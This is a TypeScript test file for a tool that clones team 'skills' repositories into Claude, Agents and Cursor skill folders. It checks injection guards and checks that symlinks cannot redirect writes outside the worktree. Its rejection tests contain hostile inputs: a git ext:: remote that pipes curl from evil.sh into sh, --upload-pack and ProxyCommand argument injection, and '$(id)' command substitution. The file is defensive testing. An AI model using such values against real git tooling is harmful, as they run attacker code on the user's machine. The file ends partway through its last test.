import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { existsSync, lstatSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import test from 'node:test';
import {
  bareDirFor,
  ensureBareClone,
  getTeamSkillsCached,
  isPinnedSha,
  isSafeRef,
  lastFetchStampPath,
  listRemoteSkills,
  materializeSkillDir,
  refreshTeamSkills,
  safeRemoteFor,
  waitForTeamSkills,
  __markCloneAttemptedForTests,
} from '../../src/skills-remote.js';

const SRC_DIR = dirname(fileURLToPath(import.meta.url));
const SKILLS_REMOTE = join(SRC_DIR, '../../src/skills-remote.ts');
const PASSIVE_FETCH_TTL_MS = 6 * 60 * 60 * 1_000;

// ---- safeRemoteFor: repo/URL injection guard (#428) --------------------------

test('safeRemoteFor rejects the git remote-helper RCE surface', () => {
  // `ext::`/`fd::` transports run arbitrary commands — the headline vector.
  assert.equal(safeRemoteFor("ext::sh -c 'curl evil.sh|sh'"), null);
  assert.equal(safeRemoteFor('fd::17'), null);
  // A leading `-` is argument injection against git's option surface.
  assert.equal(safeRemoteFor('--upload-pack=touch /tmp/pwn'), null);
  assert.equal(safeRemoteFor('-oProxyCommand=evil'), null);
  // Any scheme outside the transport allowlist.
  assert.equal(safeRemoteFor('ftp://evil/x.git'), null);
  assert.equal(safeRemoteFor('javascript://x'), null);
  assert.equal(safeRemoteFor(''), null);
  assert.equal(safeRemoteFor('   '), null);
  // A bare word is neither shorthand, URL, scp-like, nor a path.
  assert.equal(safeRemoteFor('not-a-real-remote'), null);
});

test('safeRemoteFor accepts the documented safe source shapes', () => {
  assert.equal(safeRemoteFor('open-mercato/skills'), 'https://github.com/open-mercato/skills.git');
  assert.equal(safeRemoteFor('https://github.com/o/n.git'), 'https://github.com/o/n.git');
  assert.equal(safeRemoteFor('http://internal.example/n.git'), 'http://internal.example/n.git');
  assert.equal(safeRemoteFor('ssh://git@host/o/n.git'), 'ssh://git@host/o/n.git');
  assert.equal(safeRemoteFor('git@github.com:o/n.git'), 'git@github.com:o/n.git');
  // Local paths / file:// stay working (a documented source shape).
  assert.equal(safeRemoteFor('/abs/path/to/repo'), '/abs/path/to/repo');
  assert.equal(safeRemoteFor('./rel/repo'), './rel/repo');
  assert.equal(safeRemoteFor('../sibling/repo'), '../sibling/repo');
  assert.equal(safeRemoteFor('file:///abs/repo'), 'file:///abs/repo');
  // `.` and `-` are in the owner/name charset, so a single-segment relative
  // path must be matched as a path first, not rewritten to a github.com URL.
  assert.equal(safeRemoteFor('./rel'), './rel');
  assert.equal(safeRemoteFor('../rel'), '../rel');
});

test('safeRemoteFor keeps Windows local paths working (BC §5: local path)', () => {
  // win32 is a supported platform and these worked before the hardening —
  // narrowing the `skillsRepos` source shape would be a breaking change.
  assert.equal(safeRemoteFor('C:\\skills'), 'C:\\skills');
  assert.equal(safeRemoteFor('C:/skills'), 'C:/skills');
  assert.equal(safeRemoteFor('d:\\team\\skills'), 'd:\\team\\skills');
  // Still not a licence for a drive-letter-shaped transport helper.
  assert.equal(safeRemoteFor('C:\\x::y'), null);
});

test('safeRemoteFor expands ~/ so git (no shell) can actually find it', () => {
  // execFile gives git no shell, so a literal `~` would be a directory name.
  assert.equal(safeRemoteFor('~/skills'), join(homedir(), 'skills'));
});

test('node test Git fixtures use isolated config and a fixed identity', (t) => {
  const dir = mkdtempSync(join(tmpdir(), 'cez-git-env-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  const git = (...args: string[]) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' }).trim();
  git('init', '-q', '-b', 'main');
  git('remote', 'add', 'origin', 'git@github.com:acme/demo.git');
  assert.equal(git('remote', 'get-url', 'origin'), 'git@github.com:acme/demo.git');
  git('commit', '--allow-empty', '-qm', 'fixture');
  assert.equal(git('log', '-1', '--format=%an <%ae>'), 'Cezar Tests <tests@cezar.invalid>');
  assert.equal(process.env.GIT_CONFIG_NOSYSTEM, '1');
  // Only what scripts/test-git-env.mjs writes: automatic maintenance off, nothing from the host.
  assert.deepEqual(git('config', '--global', '--list').split('\n'), ['gc.auto=0', 'maintenance.auto=false']);
});

// hearsay-tools/cezarion#1279: after a commit, Git 2.54+ maintenance repacks in the background
// once `objects/17/` holds two loose objects. dirSkillFixture's "say hi v1\n" blob is 172608…,
// so one commit id in 256 also lands there, and the repack deleted a loose object while
// `ensureBareClone` was copying it ("failed to copy file … No such file or directory").
test('node test Git fixtures start no automatic maintenance after a commit (#1279)', (t) => {
  const dir = mkdtempSync(join(tmpdir(), 'cez-git-maintenance-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  execFileSync('git', ['init', '-q', '-b', 'main'], { cwd: dir });
  const commit = spawnSync('git', ['commit', '--allow-empty', '-qm', 'traced'], {
    cwd: dir, encoding: 'utf8', env: { ...process.env, GIT_TRACE: '1' },
  });
  assert.equal(commit.status, 0, commit.stderr);
  assert.doesNotMatch(commit.stderr, /\b(?:maintenance run|gc) --auto\b/);
});

// ---- isSafeRef / isPinnedSha: ref injection guard (#428) ---------------------

test('isSafeRef rejects argument-injection and range refs', () => {
  assert.equal(isSafeRef('--output=/tmp/pwn'), false);
  assert.equal(isSafeRef('-x'), false);
  assert.equal(isSafeRef('main..evil'), false);
  assert.equal(isSafeRef('a b'), false);
  assert.equal(isSafeRef('a;b'), false);
  assert.equal(isSafeRef('$(id)'), false);
  assert.equal(isSafeRef(''), false);
});

test('isSafeRef accepts real branches, tags and SHAs', () => {
  assert.equal(isSafeRef('main'), true);
  assert.equal(isSafeRef('refs/heads/main'), true);
  assert.equal(isSafeRef('release/1.2.3'), true);
  assert.equal(isSafeRef('v1.2.3'), true);
  assert.equal(isSafeRef('a'.repeat(40)), true);
});

test('isPinnedSha recognises full sha-1 and sha-256 commit ids', () => {
  assert.equal(isPinnedSha('0'.repeat(40)), true);
  assert.equal(isPinnedSha('abcdef0123456789'.padEnd(64, '0')), true);
  assert.equal(isPinnedSha('main'), false);
  assert.equal(isPinnedSha('abc'), false); // short sha is not a pin
});

// ---- ensureBareClone refuses unsafe remotes before touching git (#428) -------

test('ensureBareClone throws on an unsafe remote instead of shelling out', async () => {
  await assert.rejects(
    ensureBareClone("ext::sh -c 'touch /tmp/pwn'"),
    /refusing unsafe skills repo remote/,
  );
});

// ---- integration: local clone still works, SHA pins, bad ref degrades --------

test('listRemoteSkills clones a local repo, pins the SHA, and refuses a bad ref', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const srcDir = mkdtempSync(join(tmpdir(), 'cez-src-'));
  const prevHome = process.env.HOME;
  process.env.HOME = home; // redirect the ~/.cache/cez skills cache into temp
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    rmSync(home, { recursive: true, force: true });
    rmSync(srcDir, { recursive: true, force: true });
  });

  const g = (args: string[]) =>
    execFileSync('git', args, { cwd: srcDir, encoding: 'utf8' }).trim();
  g(['-c', 'init.defaultBranch=main', 'init']);
  g(['config', 'user.email', 'test@example.com']);
  g(['config', 'user.name', 'Test']);
  writeFileSync(
    join(srcDir, 'SKILL.md'),
    '---\nname: demo\ndescription: a demo skill\n---\nbody text\n',
  );
  // A directory skill needs SKILL.md under a directory to be named after it.
  execFileSync('mkdir', ['-p', join(srcDir, 'greeter')]);
  writeFileSync(join(srcDir, 'greeter', 'SKILL.md'), '---\ndescription: hi\n---\nsay hi\n');
  g(['add', '-A']);
  g(['commit', '-m', 'init']);
  const sha = g(['rev-parse', 'HEAD']);

  await ensureBareClone(srcDir);

  // Branch ref: skills come back and record the resolved commit.
  const onMain = await listRemoteSkills({ repo: srcDir, ref: 'main' });
  const greeter = onMain.find((s) => s.name === 'greeter');
  assert.ok(greeter, 'expected the directory skill to be listed');
  assert.equal(greeter?.team?.commit, sha);

  // Pinned SHA ref: identical result, and the pin is honoured.
  const onSha = await listRemoteSkills({ repo: srcDir, ref: sha });
  assert.ok(onSha.some((s) => s.name === 'greeter'));

  // A wrong pinned SHA resolves to nothing (no HEAD fallback).
  const wrong = await listRemoteSkills({ repo: srcDir, ref: 'f'.repeat(40) });
  assert.deepEqual(wrong, []);

  // An injection ref is refused outright.
  const evil = await listRemoteSkills({ repo: srcDir, ref: '--output=/tmp/pwn' });
  assert.deepEqual(evil, []);
});

// ---- materialization: every supported agent skill dir gets the directory skill ----

/** The absolute `greeter` copies `materializeSkillDir` writes under `repoRoot`, in its order. */
function skillDests(repoRoot: string, ...agentDirs: string[]): string[] {
  return (agentDirs.length ? agentDirs : ['.claude', '.agents', '.cursor']).map((agentDir) => join(repoRoot, agentDir, 'skills', 'greeter'));
}

test('materializeSkillDir seeds Claude, Agents, and Cursor skill dirs and excludes them from git', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const srcDir = mkdtempSync(join(tmpdir(), 'cez-src-'));
  const repoRoot = mkdtempSync(join(tmpdir(), 'cez-root-'));
  const prevHome = process.env.HOME;
  process.env.HOME = home; // redirect the ~/.cache/cez skills cache into temp
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    for (const d of [home, srcDir, repoRoot]) rmSync(d, { recursive: true, force: true });
  });

  const g = (args: string[], cwd: string) =>
    execFileSync('git', args, { cwd, encoding: 'utf8' }).toString().trim();

  // Source skills repo: one directory skill with a companion references file.
  g(['-c', 'init.defaultBranch=main', 'init'], srcDir);
  g(['config', 'user.email', 'test@example.com'], srcDir);
  g(['config', 'user.name', 'Test'], srcDir);
  mkdirSync(join(srcDir, 'greeter', 'references'), { recursive: true });
  const skillMd = '---\ndescription: hi\n---\nsay hi\n';
  const notesMd = 'companion notes\n';
  writeFileSync(join(srcDir, 'greeter', 'SKILL.md'), skillMd);
  writeFileSync(join(srcDir, 'greeter', 'references', 'notes.md'), notesMd);
  g(['add', '-A'], srcDir);
  g(['commit', '-m', 'init'], srcDir);

  await ensureBareClone(srcDir);
  const skills = await listRemoteSkills({ repo: srcDir, ref: 'main' });
  const greeter = skills.find((s) => s.name === 'greeter');
  assert.ok(greeter, 'expected the directory skill to be listed');

  // Target project root: a git repo so the shared info/exclude exists.
  g(['-c', 'init.defaultBranch=main', 'init'], repoRoot);

  // It names every directory it wrote, so a caller can tell a skipped one apart.
  assert.deepEqual(
    await materializeSkillDir(repoRoot, greeter),
    skillDests(repoRoot),
    'materializeSkillDir should have seeded the directory skill',
  );

  // Every destination gets the full directory (SKILL.md + references/) —
  // Claude reads .claude/skills, codex/pi read .agents/skills, and Cursor reads
  // .cursor/skills. Dropping one loses that backend's companion files on disk.
  for (const agentDir of ['.claude', '.agents', '.cursor']) {
    const destSkill = join(repoRoot, agentDir, 'skills', 'greeter');
    assert.ok(
      existsSync(join(destSkill, 'SKILL.md')),
      `${agentDir}/skills/greeter/SKILL.md must be materialized`,
    );
    assert.equal(readFileSync(join(destSkill, 'SKILL.md'), 'utf8'), skillMd);
    assert.equal(
      readFileSync(join(destSkill, 'references', 'notes.md'), 'utf8'),
      notesMd,
    );
  }

  // Every path stays out of the user's git via the shared info/exclude.
  const exclude = readFileSync(join(repoRoot, '.git', 'info', 'exclude'), 'utf8');
  assert.ok(exclude.split('\n').includes('.claude/skills/greeter/'));
  assert.ok(
    exclude.split('\n').includes('.agents/skills/greeter/'),
    'exclude must contain .agents/skills/greeter/',
  );
  assert.ok(
    exclude.split('\n').includes('.cursor/skills/greeter/'),
    'exclude must contain .cursor/skills/greeter/',
  );
});

// ---- materialization: marked worktree copies replace, unmarked ones overlay (#1024) ----

const TEAM_SKILL_MARKER = '.cezar-team-skill.json';

/**
 * A temp `$HOME` (the bare-clone cache follows it), a skills repo
 * whose `greeter/` directory skill can be rewritten upstream, and a git project root.
 */
async function dirSkillFixture(t: { after: (fn: () => void) => void }) {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const srcDir = mkdtempSync(join(tmpdir(), 'cez-src-'));
  const repoRoot = mkdtempSync(join(tmpdir(), 'cez-root-'));
  const prevHome = process.env.HOME;
  process.env.HOME = home;
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    for (const d of [home, srcDir, repoRoot]) rmSync(d, { recursive: true, force: true });
  });
  const g = (args: string[], cwd: string) => execFileSync('git', args, { cwd, encoding: 'utf8' }).toString().trim();
  g(['-c', 'init.defaultBranch=main', 'init'], srcDir);
  g(['config', 'user.email', 'test@example.com'], srcDir);
  g(['config', 'user.name', 'Test'], srcDir);
  g(['-c', 'init.defaultBranch=main', 'init'], repoRoot);
  /** Make `greeter/` upstream hold exactly `files`, commit, and fetch it into the bare clone. */
  const publish = (files: Record<string, string>): string => {
    rmSync(join(srcDir, 'greeter'), { recursive: true, force: true });
    for (const [rel, body] of Object.entries(files)) {
      mkdirSync(dirname(join(srcDir, 'greeter', rel)), { recursive: true });
      writeFileSync(join(srcDir, 'greeter', rel), body);
    }
    g(['add', '-A'], srcDir);
    g(['commit', '-m', 'greeter'], srcDir);
    const bare = bareDirFor(srcDir);
    if (existsSync(join(bare, 'HEAD'))) g(['fetch', '-q', 'origin', '+refs/heads/*:refs/heads/*'], bare);
    return g(['rev-parse', 'HEAD'], srcDir);
  };
  /** The skill as a fresh listing reads it now — its body and `team.commit` at the current `main`. */
  const list = async () => {
    const skill = (await listRemoteSkills({ repo: srcDir, ref: 'main' })).find((s) => s.name === 'greeter');
    assert.ok(skill, 'expected the directory skill to be listed');
    return skill;
  };
  const v1 = publish({ 'SKILL.md': 'say hi v1\n', 'references/notes.md': 'notes v1\n', 'references/old.md': 'old\n' });
  await ensureBareClone(srcDir);
  const greeter = await list();
  return { srcDir, repoRoot, greeter, publish, list, v1 };
}

test('materializeSkillDir marks its worktree copies and replaces a marked copy at a newer commit', async (t) => {
  const { srcDir, repoRoot, greeter, publish, list, v1 } = await dirSkillFixture(t);
  assert.deepEqual(await materializeSkillDir(repoRoot, greeter), skillDests(repoRoot));
  for (const agentDir of ['.claude', '.agents', '.cursor']) {
    const marker = JSON.parse(readFileSync(join(repoRoot, agentDir, 'skills', 'greeter', TEAM_SKILL_MARKER), 'utf8'));
    assert.deepEqual(marker, { repo: srcDir, ref: 'main', path: 'greeter/SKILL.md', commit: v1 });
  }

  // Upstream drops references/old.md and changes SKILL.md.
  const v2 = publish({ 'SKILL.md': 'say hi v2\n', 'references/notes.md': 'notes v1\n' });
  assert.deepEqual(await materializeSkillDir(repoRoot, await list()), skillDests(repoRoot));
  for (const agentDir of ['.claude', '.agents', '.cursor']) {
    const dest = join(repoRoot, agentDir, 'skills', 'greeter');
    assert.equal(readFileSync(join(dest, 'SKILL.md'), 'utf8'), 'say hi v2\n');
    assert.equal(readFileSync(join(dest, 'references', 'notes.md'), 'utf8'), 'notes v1\n');
    assert.equal(existsSync(join(dest, 'references', 'old.md')), false, `${agentDir}: a file dropped upstream must not linger`);
    assert.equal(JSON.parse(readFileSync(join(dest, TEAM_SKILL_MARKER), 'utf8')).commit, v2);
  }
});

test('materializeSkillDir copies the commit the skill was listed at, not where the ref moved since', async (t) => {
  const { repoRoot, greeter, publish, v1 } = await dirSkillFixture(t);
  // Another project fetches main to v2 between listing and materializing.
  publish({ 'SKILL.md': 'say hi v2\n', 'references/notes.md': 'notes v2\n' });

  assert.deepEqual(await materializeSkillDir(repoRoot, greeter), skillDests(repoRoot));
  for (const agentDir of ['.claude', '.agents', '.cursor']) {
    const dest = join(repoRoot, agentDir, 'skills', 'greeter');
    assert.equal(readFileSync(join(dest, 'SKILL.md'), 'utf8'), 'say hi v1\n', agentDir);
    assert.equal(readFileSync(join(dest, 'references', 'notes.md'), 'utf8'), 'notes v1\n', agentDir);
    assert.equal(JSON.parse(readFileSync(join(dest, TEAM_SKILL_MARKER), 'utf8')).commit, v1, agentDir);
  }
});

test('materializeSkillDir replaces a marked copy whose file became a directory upstream', async (t) => {
  const { repoRoot, publish, list } = await dirSkillFixture(t);
  publish({ 'SKILL.md': 'say hi\n', 'references/guide': 'guide as one file\n' });
  assert.deepEqual(await materializeSkillDir(repoRoot, await list()), skillDests(repoRoot));

  publish({ 'SKILL.md': 'say hi\n', 'references/guide/new.md': 'guide split up\n' });
  assert.deepEqual(await materializeSkillDir(repoRoot, await list()), skillDests(repoRoot));
  for (const agentDir of ['.claude', '.agents', '.cursor']) {
    const dest = join(repoRoot, agentDir, 'skills', 'greeter');
    assert.equal(readFileSync(join(dest, 'references', 'guide', 'new.md'), 'utf8'), 'guide split up\n', agentDir);
  }
});

test('materializeSkillDir replaces a marked copy whose directory became a file upstream', async (t) => {
  const { repoRoot, publish, list } = await dirSkillFixture(t);
  publish({ 'SKILL.md': 'say hi\n', 'references/guide/part.md': 'guide in parts\n' });
  assert.deepEqual(await materializeSkillDir(repoRoot, await list()), skillDests(repoRoot));

  publish({ 'SKILL.md': 'say hi\n', 'references/guide': 'guide merged back\n' });
  assert.deepEqual(await materializeSkillDir(repoRoot, await list()), skillDests(repoRoot));
  for (const agentDir of ['.claude', '.agents', '.cursor']) {
    const dest = join(repoRoot, agentDir, 'skills', 'greeter');
    assert.equal(readFileSync(join(dest, 'references', 'guide'), 'utf8'), 'guide merged back\n', agentDir);
  }
});

test('materializeSkillDir overlays an unmarked existing dir without deleting or marking it', async (t) => {
  const { repoRoot, greeter } = await dirSkillFixture(t);
  const own = join(repoRoot, '.claude', 'skills', 'greeter');
  mkdirSync(own, { recursive: true });
  writeFileSync(join(own, 'mine.md'), 'the user wrote this\n');

  assert.deepEqual(await materializeSkillDir(repoRoot, greeter), skillDests(repoRoot));
  assert.equal(readFileSync(join(own, 'mine.md'), 'utf8'), 'the user wrote this\n');
  assert.equal(readFileSync(join(own, 'SKILL.md'), 'utf8'), 'say hi v1\n');
  assert.equal(existsSync(join(own, TEAM_SKILL_MARKER)), false, 'an unmarked dir must never become ours');
  // The destinations cezar created itself are still marked.
  assert.equal(existsSync(join(repoRoot, '.agents', 'skills', 'greeter', TEAM_SKILL_MARKER)), true);
});

test('materializeSkillDir never clears a type conflict inside an unmarked dir', async (t) => {
  const { repoRoot, publish, list } = await dirSkillFixture(t);
  const own = join(repoRoot, '.claude', 'skills', 'greeter');
  mkdirSync(join(own, 'references'), { recursive: true });
  writeFileSync(join(own, 'references', 'guide'), 'the user wrote this\n');

  publish({ 'SKILL.md': 'say hi\n', 'references/guide/new.md': 'guide split up\n' });
  await materializeSkillDir(repoRoot, await list()).catch(() => []);
  assert.equal(readFileSync(join(own, 'references', 'guide'), 'utf8'), 'the user wrote this\n');
});

// ---- materialization: nothing is written or pruned outside the worktree (#1024) ----

/** A temp directory outside the fixture's worktree, removed after the test. */
function outsideDir(t: { after: (fn: () => void) => void }): string {
  const dir = mkdtempSync(join(tmpdir(), 'cez-outside-'));
  t.after(() => rmSync(dir, { recursive: true, force: true }));
  return dir;
}

test('materializeSkillDir skips a destination whose symlinked agent dir leads out of the worktree', async (t) => {
  const { repoRoot, publish, list } = await dirSkillFixture(t);
  // `.claude` linked to another checkout's, the way a hand-made worktree setup links it.
  const outside = outsideDir(t);
  symlinkSync(outside, join(repoRoot, '.claude'));

  publish({ 'SKILL.md': 'say hi\n', 'references/guide/part.md': 'guide in parts\n' });
  assert.deepEqual(await materializeSkillDir(repoRoot, await list()), skillDests(repoRoot, '.agents', '.cursor'));
  assert.deepEqual(readdirSync(outside), [], 'nothing may be created through the escaping link');
  for (const agentDir of ['.agents', '.cursor']) {
    const dest = join(repoRoot, agentDir, 'skills', 'greeter');
    assert.equal(readFileSync(join(dest, 'references', 'guide', 'part.md'), 'utf8'), 'guide in parts\n', agentDir);
    assert.equal(existsSync(join(dest, TEAM_SKILL_MARKER)), true, agentDir);
  }

  // The user's own files out there survive a refresh that turns guide/ into a file.
  const theirs = join(outside, 'skills', 'greeter');
  mkdirSync(join(theirs, 'references', 'guide'), { recursive: true });
  writeFileSync(join(theirs, 'references', 'guide', 'mine.md'), 'the user wrote this\n');
  writeFileSync(join(theirs, 'mine.md'), 'the user wrote this too\n');
  publish({ 'SKILL.md': 'say hi\n', 'references/guide': 'guide merged back\n' });
  assert.deepEqual(await materializeSkillDir(repoRoot, await list()), skillDests(repoRoot, '.agents', '.cursor'));
  assert.equal(readFileSync(join(theirs, 'references', 'guide', 'mine.md'), 'utf8'), 'the user wrote this\n');
  assert.equal(readFileSync(join(theirs, 'mine.md'), 'utf8'), 'the user wrote this too\n');
  assert.equal(existsSync(join(theirs, 'SKILL.md')), false);
  assert.equal(existsSync(join(theirs, TEAM_SKILL_MARKER)), false);
  assert.equal(
    readFileSync(join(repoRoot, '.agents', 'skills', 'greeter', 'references', 'guide'), 'utf8'),
    'guide merged back\n',
  );
  const exclude = readFileSync(join(repoRoot, '.git', 'info', 'exclude'), 'utf8').split('\n');
  assert.equal(exclude.includes('.claude/skills/greeter/'), false, 'a skipped destination is not excluded');
  assert.equal(exclude.includes('.agents/skills/greeter/'), true);
});

test('materializeSkillDir writes nothing and returns no dirs when every destination leads out of the worktree', async (t) => {
  const { repoRoot, greeter } = await dirSkillFixture(t);
  const outside = outsideDir(t);
  for (const agentDir of ['.claude', '.agents', '.cursor']) {
    mkdirSync(join(outside, agentDir));
    symlinkSync(join(outside, agentDir), join(repoRoot, agentDir));
  }
  // A symlinked `<name>` dir counts too, even under a real agent dir.
  const linkedName = outsideDir(t);
  rmSync(join(repoRoot, '.cursor'));
  mkdirSync(join(repoRoot, '.cursor', 'skills'), { recursive: true });
  symlinkSync(linkedName, join(repoRoot, '.cursor', 'skills', 'greeter'));

  assert.deepEqual(await materializeSkillDir(repoRoot, greeter), []);
  for (const agentDir of ['.claude', '.agents', '.cursor']) {
    assert.deepEqual(readdirSync(join(outside, agentDir)), [], agentDir);
  }
  assert.deepEqual(readdirSync(linkedName), []);
});

test('materializeSkillDir follows a symlinked agent dir that stays inside the worktree', async (t) => {
  const { repoRoot, greeter } = await dirSkillFixture(t);
  mkdirSync(join(repoRoot, '.agents'));
  symlinkSync('.agents', join(repoRoot, '.claude')); // a tracked relative link

  assert.deepEqual(await materializeSkillDir(repoRoot, greeter), skillDests(repoRoot));
  assert.equal(readFileSync(join(repoRoot, '.claude', 'skills', 'greeter', 'SKILL.md'), 'utf8'), 'say hi v1\n');
  assert.equal(readFileSync(join(repoRoot, '.agents', 'skills', 'greeter', 'references', 'notes.md'), 'utf8'), 'notes v1\n');
});

test('materializeSkillDir unlinks symlinks inside a marked copy instead of following them out', async (t) => {
  const { repoRoot, greeter } = await dirSkillFixture(t);
  assert.deepEqual(await materializeSkillDir(repoRoot, greeter), skillDests(repoRoot));
  const outside = outsideDir(t);
  writeFileSync(join(outside, 'kept.md'), 'outside file\n');
  mkdirSync(join(outside, 'dir'));
  writeFileSync(join(outside, 'dir', 'kept.md'), 'outside dir file\n');

  const dest = join(repoRoot, '.claude', 'skills', 'greeter');
  rmSync(join(dest, 'SKILL.md'));
  symlinkSync(join(outside, 'kept.md'), join(dest, 'SKILL.md')); // where a file goes
  rmSync(join(dest, 'references'), { recursive: true });
  symlinkSync(join(outside, 'dir'), join(dest, 'references')); // where a file's parent goes
  symlinkSync(join(outside, 'dir'), join(dest, 'escape')); // nothing goes here

  assert.deepEqual(await materializeSkillDir(repoRoot, greeter), skillDests(repoRoot));
  assert.equal(lstatSync(join(dest, 'SKILL.md')).isFile(), true);
  assert.equal(readFileSync(join(dest, 'SKILL.md'), 'utf8'), 'say hi v1\n');
  assert.equal(lstatSync(join(dest, 'references')).isDirectory(), true);
  assert.equal(readFileSync(join(dest, 'references', 'notes.md'), 'utf8'), 'notes v1\n');
  assert.equal(existsSync(join(dest, 'escape')), false);
  assert.equal(readFileSync(join(outside, 'kept.md'), 'utf8'), 'outside file\n');
  assert.deepEqual(readdirSync(join(outside, 'dir')), ['kept.md']);
  assert.equal(readFileSync(join(outside, 'dir', 'kept.md'), 'utf8'), 'outside dir file\n');
});

test('materializeSkillDir never takes a dir whose marker is a symlink for its own', async (t) => {
  const { repoRoot, greeter } = await dirSkillFixture(t);
  const own = join(repoRoot, '.claude', 'skills', 'greeter');
  mkdirSync(own, { recursive: true });
  writeFileSync(join(own, 'mine.md'), 'the user wrote this\n');
  const outside = outsideDir(t);
  writeFileSync(join(outside, 'file.json'), 'outside file\n');
  symlinkSync(join(outside, 'file.json'), join(own, TEAM_SKILL_MARKER));

  assert.deepEqual(await materializeSkillDir(repoRoot, greeter), skillDests(repoRoot));
  assert.equal(readFileSync(join(outside, 'file.json'), 'utf8'), 'outside file\n');
  assert.equal(readFileSync(join(own, 'mine.md'), 'utf8'), 'the user wrote this\n', 'an unmarked dir is never pruned');
});

test('materializeSkillDir never writes through a symlink inside an unmarked dir that leads out', async (t) => {
  const { repoRoot, greeter } = await dirSkillFixture(t);
  const own = join(repoRoot, '.claude', 'skills', 'greeter');
  mkdirSync(own, { recursive: true });
  const outside = outsideDir(t);
  symlinkSync(outside, join(own, 'references'));

  assert.deepEqual(await materializeSkillDir(repoRoot, greeter), skillDests(repoRoot));
  assert.deepEqual(readdirSync(outside), []);
  assert.equal(readFileSync(join(own, 'SKILL.md'), 'utf8'), 'say hi v1\n');
  assert.equal(lstatSync(join(own, 'references')).isSymbolicLink(), true, 'the user\'s own link is kept');
});

// ---- per-project team-skills cache isolation (multi-project workspace, 2.6) --

test('team-skills cache is keyed by repoRoot — projects never see each other\'s skills', async (t) => {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const prevHome = process.env.HOME;
  process.env.HOME = home; // redirect the ~/.cache/cez skills cache into temp
  const dirs: string[] = [home];
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    for (const d of dirs) rmSync(d, { recursive: true, force: true });
  });

  /** One local skills repo carrying a single directory skill named `name`. */
  const makeSkillsRepo = (name: string): string => {
    const src = mkdtempSync(join(tmpdir(), `cez-src-${name}-`));
    dirs.push(src);
    const g = (args: string[]) => execFileSync('git', args, { cwd: src, encoding: 'utf8' });
    g(['-c', 'init.defaultBranch=main', 'init']);
    g(['config', 'user.email', 'test@example.com']);
    g(['config', 'user.name', 'Test']);
    mkdirSync(join(src, name));
    writeFileSync(join(src, name, 'SKILL.md'), `---\ndescription: ${name}\n---\n${name} body\n`);
    g(['add', '-A']);
    g(['commit', '-m', 'init']);
    return src;
  };

  /** One project root whose `.ai/cezar/config.json` points at its own skills repo. */
  const makeProjectRoot = (skillsRepo: string): string => {
    const root = mkdtempSync(join(tmpdir(), 'cez-root-'));
    dirs.push(root);
    mkdirSync(join(root, '.ai/cezar'), { recursive: true });
    writeFileSync(
      join(root, '.ai/cezar', 'config.json'),
      JSON.stringify({ skillsRepos: [{ repo: skillsRepo, ref: 'main' }] }),
    );
    return root;
  };

  const rootA = makeProjectRoot(makeSkillsRepo('alpha-skill'));
  const rootB = makeProjectRoot(makeSkillsRepo('beta-skill'));

  const loadedA = await refreshTeamSkills(rootA);
  const loadedB = await refreshTeamSkills(rootB);
  assert.deepEqual(loadedA.map((s) => s.name), ['alpha-skill']);
  assert.deepEqual(loadedB.map((s) => s.name), ['beta-skill']);

  // The regression: the cache was one module-global list, so after B's load,
  // A's scope was served B's skills. Each root must keep its own entry.
  assert.deepEqual(getTeamSkillsCached(rootA).map((s) => s.name), ['alpha-skill']);
  assert.deepEqual(getTeamSkillsCached(rootB).map((s) => s.name), ['beta-skill']);
});

// ---- cross-process last-fetch stamp (#367) ------------------------------------

function makeSkillsRepoWithHome(t: { after: (fn: () => void) => void }): {
  home: string;
  srcDir: string;
  makeProjectRoot: () => string;
  commit: (message: string) => string;
} {
  const home = mkdtempSync(join(tmpdir(), 'cez-home-'));
  const srcDir = mkdtempSync(join(tmpdir(), 'cez-src-'));
  const dirs = [home, srcDir];
  const prevHome = process.env.HOME;
  process.env.HOME = home;
  t.after(() => {
    if (prevHome === undefined) delete process.env.HOME;
    else process.env.HOME = prevHome;
    for (const d of dirs) rmSync(d, { recursive: true, force: true });
  });

  const g = (args: string[]) =>
    execFileSync('git', args, { cwd: srcDir, encoding: 'utf8' }).trim();
  g(['-c', 'init.defaultBranch=main', 'init']);
  g(['config', 'user.email', 'test@example.com']);
  g(['config', 'user.name', 'Test']);
  mkdirSync(join(srcDir, 'greeter'));
  writeFileSync(join(srcDir, 'greeter', 'SKILL.md'), '---\ndescription: hi\n---\nsay hi\n');
  g(['add', '-A']);
  g(['commit', '-m', 'init']);

  return {
    home,
    srcDir,
    makeProjectRoot() {
      const root = mkdtempSync(join(tmpdir(), 'cez-root-'));
      dirs.push(root);
      mkdirSync(join(root, '.ai/cezar'), { recursive: true });
      writeFileSync(
        join(root, '.ai/cezar', 'config.json'),
        JSON.stringify({ skillsRepos: [{ repo: srcDir, ref: 'main' }] }),
      );
      return root;
    },
    commit(message: string) {
      writeFileSync(join(srcDir, 'greeter', 'SKILL.md'), `---\ndescription: ${message}\n---\n${message}\n`);
      g(['add', '-A']);
      g(['commit', '-m', message]);
      return g(['rev-parse', 'HEAD']);
    },
  };
}

function childTeamSkillCommit(home: string, repoRoot: string): string {
  const script = `
    process.env.HOME = ${JSON.stringify(home)};
    const { waitForTeamSkills } = await import(${JSON.stringify(SKILLS_REMOTE)});
    const skills = await waitForTeamSkills(${JSON.stringify(repoRoot)});
    const greeter = skills.find((s) => s.name === 'greeter');
    process.stdout.write(greeter?.team?.commit ?? '');
  `;
  return execFileSync(process.execPath, ['--import', 'tsx', '--input-type=module', '-e', script], {
    encoding: 'utf8',
    timeout: 30_000,
  }).trim();
}

test('a new process with a fresh stamp does not git-fetch on first catalog read (#367)', async (t) => {
